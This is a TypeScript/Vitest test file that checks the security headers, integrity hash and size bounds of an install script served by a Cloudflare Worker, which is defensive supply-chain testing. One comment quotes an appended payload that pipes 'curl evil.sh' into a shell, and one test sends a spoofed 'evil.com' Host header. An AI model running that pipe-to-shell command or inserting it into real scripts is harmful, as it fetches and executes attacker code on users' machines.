import { SELF } from "cloudflare:test";
import { describe, it, expect } from "vitest";
import { REDIRECT_URL, expectInstallScript } from "./_helpers.ts";
import { INSTALL_SH_B64 } from "../src/embedded";

// RED tests — response header contract and body integrity (H-01..H-08 from
// security-audit/phase-2-pen-test-additions.md).
//
// Threat: the install-script response is the supply-chain trust boundary.
// Three classes of failure are catastrophic and only visible in the response
// envelope:
//
//   1. Sniff/MIME confusion — if `Content-Type` is wrong or `nosniff` is
//      missing, a browser that ever fetches the script (XSS risk, accidental
//      <script src>) can be tricked into rendering it as HTML and executing
//      attacker-influenced bytes.
//   2. Transport hijack — without HSTS preload, an MITM on the first request
//      can downgrade `https://worthless.sh` to `http://` and inject. CIS
//      Benchmark + Chrome HSTS preload list (hstspreload.org) require
//      `max-age=63072000; includeSubDomains; preload`.
//   3. Bytes-on-the-wire drift — without `X-Worthless-Script-Sha256` and
//      a body integrity invariant, an attacker who hijacks the deploy
//      pipeline can append a single shell command and every UA / cache /
//      method test still passes. The header is the "trust by computation"
//      mechanism: `curl worthless.sh | sha256sum` matches the header.
//
// Pre-implementation, the stub returns HTTP 500. Every assertion below pins
// a positive contract that the stub fails. We do NOT use `if (X) expect(Y)`
// vacuous shapes; preconditions are unconditional.
//
// Banner-disclosure findings (H-07) align with NIST SP 800-53 SI-11 and OWASP
// API8 Security Misconfiguration: no `Server`, `X-Powered-By`, or `Via`
// reflection that discloses framework / version.
//
// Note on H-08 (byte-exact body): the canonical install.sh isn't bundled into
// the Worker yet (Phase 3 will land `import INSTALL_SH from "../../install.sh?raw"`
// per ADR-001 Option A). Until then, H-08 is asserted via two transitional
// invariants — (a) shebang prefix, (b) body length floor + ceiling. This is
// strictly weaker than byte-equality but catches the appended-command class.

const CURL_UA = "curl/8.4.0";
const BROWSER_UA =
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15";

/**
 * Compute SHA-256 hex digest of a UTF-8 string. Uses Web Crypto so it runs in
 * the workerd test runtime without a Node import.
 */
async function sha256Hex(input: string): Promise<string> {
  const buf = await crypto.subtle.digest(
    "SHA-256",
    new TextEncoder().encode(input),
  );
  return Array.from(new Uint8Array(buf))
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

describe("install-script content-type is exact text/plain;charset=utf-8 (H-01)", () => {
  // H-01: any deviation (`application/octet-stream`, `text/plain` without
  // charset, missing entirely) opens MIME-sniff XSS in browsers that mistake
  // the response for HTML. Exact match — not a regex.
  it("Content-Type exactly equals 'text/plain; charset=utf-8'", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    // Unconditional precondition: the install branch was reached.
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toBe("text/plain; charset=utf-8");
  });

  it("walkthrough Content-Type also exactly equals 'text/plain; charset=utf-8'", async () => {
    const res = await SELF.fetch("https://worthless.sh/?explain=1", {
      headers: { "user-agent": CURL_UA },
    });
    expect(res.status).toBe(200);
    expect(res.headers.get("content-type")).toBe("text/plain; charset=utf-8");
  });
});

describe("X-Content-Type-Options: nosniff is set on every response (H-02)", () => {
  // H-02: `nosniff` instructs browsers to honor the declared Content-Type
  // and refuse to render the body as anything else. Required on all 200s
  // and the 302 redirect (defence-in-depth if a body slips through).
  it("install-script response carries X-Content-Type-Options: nosniff", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    expect(res.status).toBe(200);
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
  });

  it("redirect response carries X-Content-Type-Options: nosniff", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": BROWSER_UA },
      redirect: "manual",
    });
    expect(res.status).toBe(302);
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
  });

  it("walkthrough response carries X-Content-Type-Options: nosniff", async () => {
    const res = await SELF.fetch("https://worthless.sh/?explain=1", {
      headers: { "user-agent": CURL_UA },
    });
    expect(res.status).toBe(200);
    expect(res.headers.get("x-content-type-options")).toBe("nosniff");
  });
});

describe("Content-Security-Policy is set on the redirect (H-03)", () => {
  // H-03: a 302 normally has no body, but browsers historically render
  // `<a href>` style bodies on redirect under quirks. CSP `default-src 'none'`
  // ensures no script can run if a body ever leaks through.
  it("302 redirect response includes a Content-Security-Policy header", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": BROWSER_UA },
      redirect: "manual",
    });
    expect(res.status).toBe(302);
    const csp = res.headers.get("content-security-policy");
    expect(csp).not.toBeNull();
    // Pin the strict-default-deny shape — anything more permissive defeats
    // the defence-in-depth goal of having CSP on a redirect at all.
    expect(csp).toMatch(/default-src\s+'none'/);
  });
});

describe("Strict-Transport-Security is HSTS-preload eligible (H-04)", () => {
  // H-04: Chrome HSTS preload list (hstspreload.org) requires:
  //   - max-age >= 31536000 (we use 63072000 — 2 years)
  //   - includeSubDomains
  //   - preload
  // CIS Benchmark for web servers also requires these. Without preload, the
  // very first visit can be MITM'd and downgraded to HTTP.
  it("install-script response declares HSTS with preload-eligible directives", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    expect(res.status).toBe(200);
    const hsts = res.headers.get("strict-transport-security");
    expect(hsts).toBe(
      "max-age=63072000; includeSubDomains; preload",
    );
  });

  it("redirect response also declares the same HSTS string", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": BROWSER_UA },
      redirect: "manual",
    });
    expect(res.status).toBe(302);
    const hsts = res.headers.get("strict-transport-security");
    expect(hsts).toBe(
      "max-age=63072000; includeSubDomains; preload",
    );
  });
});

describe("Referrer-Policy is no-referrer (H-05)", () => {
  // H-05: when the browser follows the 302 to wless.io, it would otherwise
  // send `Referer: https://worthless.sh/`. wless.io's logs would then
  // accumulate a per-visitor record of "this user just ran the install
  // script". `no-referrer` is the strict policy.
  it("redirect response sets Referrer-Policy: no-referrer", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": BROWSER_UA },
      redirect: "manual",
    });
    expect(res.status).toBe(302);
    expect(res.headers.get("referrer-policy")).toBe("no-referrer");
  });

  it("install-script response also sets Referrer-Policy: no-referrer", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    expect(res.status).toBe(200);
    expect(res.headers.get("referrer-policy")).toBe("no-referrer");
  });
});

describe("X-Worthless-Script-Sha256 header matches body sha256 (H-06)", () => {
  // H-06: this is the trust-by-computation mechanism. `curl worthless.sh |
  // sha256sum` must match the documented sha. Header presence is mandatory
  // for the install-script response; the value MUST equal sha256(body).
  it("install-script response includes X-Worthless-Script-Sha256 header", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    expect(res.status).toBe(200);
    const sha = res.headers.get("x-worthless-script-sha256");
    expect(sha).not.toBeNull();
    // Lowercase hex, exactly 64 chars (256 bits / 4 per nibble).
    expect(sha).toMatch(/^[0-9a-f]{64}$/);
  });

  it("X-Worthless-Script-Sha256 value equals SHA-256(response body)", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    expect(res.status).toBe(200);
    const declared = res.headers.get("x-worthless-script-sha256");
    expect(declared).not.toBeNull();
    const body = await res.text();
    const computed = await sha256Hex(body);
    // The headline integrity contract.
    expect(computed).toBe(declared);
  });

  it("walkthrough response does NOT advertise X-Worthless-Script-Sha256 (it's not the script)", async () => {
    // The header exists to authenticate the install bytes. If it appears on
    // the walkthrough body too, an attacker confused about which response is
    // which could verify the WRONG sha — false trust.
    const res = await SELF.fetch("https://worthless.sh/?explain=1", {
      headers: { "user-agent": CURL_UA },
    });
    expect(res.status).toBe(200);
    expect(res.headers.get("x-worthless-script-sha256")).toBeNull();
  });
});

describe("server / framework banners are not disclosed (H-07)", () => {
  // H-07 + audit-review NIST SP 800-53 SI-11 / OWASP API8: any header that
  // tells an attacker "you are talking to Hono 4.7 on workerd 1.20251102"
  // narrows their exploit search. Cloudflare may add `Server: cloudflare`
  // and `CF-Ray: …` at the edge — those are Cloudflare's identity, not the
  // Worker's, so we test the Worker's contract: the Worker MUST NOT add
  // any of these itself, and any value present MUST NOT disclose framework
  // identifiers.
  const probedUAs = [
    { name: "curl", ua: CURL_UA },
    { name: "browser", ua: BROWSER_UA },
  ];
  for (const { name, ua } of probedUAs) {
    it(`${name} response does not include X-Powered-By`, async () => {
      const res = await SELF.fetch("https://worthless.sh/", {
        headers: { "user-agent": ua },
        redirect: "manual",
      });
      // Unconditional precondition — Worker actually responded.
      expect(res.status).toBeLessThan(500);
      expect(res.headers.get("x-powered-by")).toBeNull();
    });

    it(`${name} response does not include Via`, async () => {
      const res = await SELF.fetch("https://worthless.sh/", {
        headers: { "user-agent": ua },
        redirect: "manual",
      });
      expect(res.status).toBeLessThan(500);
      expect(res.headers.get("via")).toBeNull();
    });

    it(`${name} response Server header (if present) does not name a framework`, async () => {
      const res = await SELF.fetch("https://worthless.sh/", {
        headers: { "user-agent": ua },
        redirect: "manual",
      });
      expect(res.status).toBeLessThan(500);
      const server = res.headers.get("server");
      // Either absent, or value is opaque (e.g., "cloudflare") — never names
      // a framework or version. We pin both directions:
      //   1. positive precondition: response was processed
      //   2. assertion: if Server is set, it does not contain banned tokens
      // Keep the assertion list literal so a Hono/workerd/express leak fails.
      const banned = ["hono", "express", "workerd", "node", "fastify", "itty"];
      const lowered = (server ?? "").toLowerCase();
      for (const token of banned) {
        expect(lowered).not.toContain(token);
      }
    });
  }

  it("install-script body does NOT contain framework version markers", async () => {
    // Defence in depth: even if a framework leaks via the body (e.g., a
    // stack trace stringified into the script), the install script itself
    // must be free of framework identifiers.
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    expect(res.status).toBe(200);
    const body = await res.text();
    const banned = [
      "X-Powered-By",
      "Hono",
      "workerd v",
      "node_modules",
      "Cloudflare Workers/",
    ];
    for (const token of banned) {
      expect(body).not.toContain(token);
    }
  });
});

describe("body integrity — install.sh shape and bounded size (H-08)", () => {
  // H-08: byte-equality (the headline integrity contract) PLUS shape /
  // size guards as belt-and-braces. They catch different failure modes:
  //   (a) Byte-equality — substitution. Bundle drift, attacker who flips
  //       a single byte, template-injection that re-emits a "valid" script.
  //   (b) Shape (shebang + Worthless marker) — the served bytes are at
  //       least syntactically the install script (catches truncation /
  //       null body returned with 200).
  //   (c) Size CEILING — corruption / appended payload. Surgical 50-byte
  //       appends caught by the 20 KB tight ceiling, not the 100 KB upper.
  // The shape and size assertions are intentionally kept after byte-equality
  // landed — they pinpoint truncation vs substitution as different bugs.
  // WOR-323 promoted byte-equality from the original "Phase 3 will add this"
  // TODO. The bundle ships via scripts/embed-assets.mjs (base64 → embedded.ts)
  // because of the CF WAF discovery in WOR-349 Phase 6.0; we decode the
  // bundled blob here and compare against the served body.
  it("install-script body byte-equals decoded INSTALL_SH_B64 (substitution guard)", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    expect(res.status).toBe(200);
    const body = await res.text();
    // `atob` returns a binary string (one byte per char); install.sh has
    // multi-byte UTF-8 (em-dashes etc.). Round-trip through TextDecoder.
    const bin = atob(INSTALL_SH_B64);
    const expected = new TextDecoder("utf-8").decode(
      Uint8Array.from(bin, (c) => c.charCodeAt(0)),
    );
    expect(body).toBe(expected);
  });

  it("install-script body matches canonical shape (shebang + marker + size floor)", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    await expectInstallScript(res);
  });

  it("install-script body is bounded — under 100 KB ceiling (corruption / injection guard)", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    expect(res.status).toBe(200);
    const body = await res.text();
    // install.sh is ~12 KB. 100 KB ceiling = 8× headroom. Anything bigger is
    // a smoking gun for template injection or appended attacker payload.
    expect(body.length).toBeLessThan(100_000);
  });

  it("install-script body is bounded — under 24.5 KB tight ceiling (surgical injection guard)", async () => {
    // Per pen-tester Batch-3 review: 100 KB ceiling above is the corruption
    // guard, but a surgical 50-byte append (`; curl evil.sh | sh`) wouldn't
    // trip it. Pin a tight ceiling near install.sh's actual size — any
    // appended payload large enough to matter is caught here. The 100 KB
    // test stays as the corruption upper bound.
    //
    // Ceiling history:
    //   - Pre-Tier A: install.sh was ~12 KB. 20 KB ceiling = ~8 KB slack.
    //   - Post-WOR-673 (A2 env scrub + PATH lockdown): install.sh is ~23 KB.
    //     48-var unset block (11 attack classes) + PATH defense + honest
    //     proxy_hints + threat-model comments add ~11 KB of substantive
    //     security content. Ceiling at 24.5 KB keeps ~1.3 KB slack — tight,
    //     intentionally. Each future bump must cite the WOR ticket that
    //     justifies the growth and be a real discussion, not a ratchet.
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    expect(res.status).toBe(200);
    const body = await res.text();
    expect(body.length).toBeLessThan(24_500);
  });

  it("install-script body Content-Length header matches actual byte length", async () => {
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    expect(res.status).toBe(200);
    const declared = res.headers.get("content-length");
    expect(declared).not.toBeNull();
    const body = await res.text();
    // CDN-mediated truncation could re-introduce a partial body even if the
    // origin Worker is correct. Pin Content-Length parity.
    const declaredBytes = Number(declared);
    expect(Number.isFinite(declaredBytes)).toBe(true);
    expect(declaredBytes).toBe(new TextEncoder().encode(body).byteLength);
  });

  it("two sequential install-script reads yield identical bodies (replay determinism)", async () => {
    // Idempotency / supply-chain: the bytes a user sees today must equal the
    // bytes they saw 10 seconds ago, otherwise reproducible-byte verification
    // (compare to a documented sha) becomes a TOCTOU.
    const r1 = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    const r2 = await SELF.fetch("https://worthless.sh/", {
      headers: { "user-agent": CURL_UA },
    });
    expect(r1.status).toBe(200);
    expect(r2.status).toBe(200);
    const b1 = await r1.text();
    const b2 = await r2.text();
    expect(b1).toBe(b2);
  });

  it("redirect Location is exact REDIRECT_URL, not a Host-confused variant", async () => {
    // Defence in depth tied to integrity: a redirect that follows a
    // Host-injected value would let an attacker who can spoof the Host
    // header (not normally possible at CF edge, but pin contract) point
    // browsers at attacker-controlled origins.
    const res = await SELF.fetch("https://worthless.sh/", {
      headers: {
        "user-agent": BROWSER_UA,
        // Host-confusion attempt — must not redirect to *.evil.com
        host: "worthless.sh.evil.com",
      },
      redirect: "manual",
    });
    expect(res.status).toBe(302);
    expect(res.headers.get("location")).toBe(REDIRECT_URL);
  });
});
